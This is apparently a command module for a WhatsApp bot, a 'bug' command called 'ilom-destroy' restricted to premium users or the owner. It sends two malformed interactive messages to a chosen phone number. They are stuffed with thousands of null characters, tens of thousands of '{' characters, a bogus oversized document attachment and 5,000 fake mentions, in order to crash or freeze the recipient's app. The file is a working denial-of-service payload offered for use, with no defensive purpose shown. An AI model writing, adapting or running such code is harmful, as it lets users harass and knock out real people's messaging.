import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'ilom-destroy', aliases: ['destroy', 'idestroy'], category: 'bug',
    description: 'Ilom destroyer attack on target number', usage: 'ilom-destroy <number>', cooldown: 20, ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ Usage: .ilom-destroy <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '💀', key: message.key } });
        try {
            await sock.relayMessage(t, { ephemeralMessage: { message: { interactiveMessage: { header: { title: "\u0000".repeat(2000), hasMediaAttachment: false, documentMessage: { url: "https://example.com/crash.pdf", mimetype: "application/pdf", title: "\u0000".repeat(500), fileSize: 9999999999999, pageCount: 9999 } }, body: { text: "\u0000".repeat(2000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(50000) }, contextInfo: { mentionedJid: Array.from({ length: 5000 }, (_, i) => `${i}@s.whatsapp.net`) } } } } }, {});
            await sock.relayMessage(t, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadata: {} }, interactiveMessage: { header: { title: "📞", hasMediaAttachment: false }, body: { text: "\u0000".repeat(5000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(30000) } } } } }, {});
            await sock.sendMessage(from, { text: '✅ Destroy sent' }, { quoted: message });
        } catch (e) { await sock.sendMessage(from, { text: '❌ ' + e.message }, { quoted: message }); }
        await sock.sendMessage(from, { react: { text: '✅', key: message.key } });
    }
};
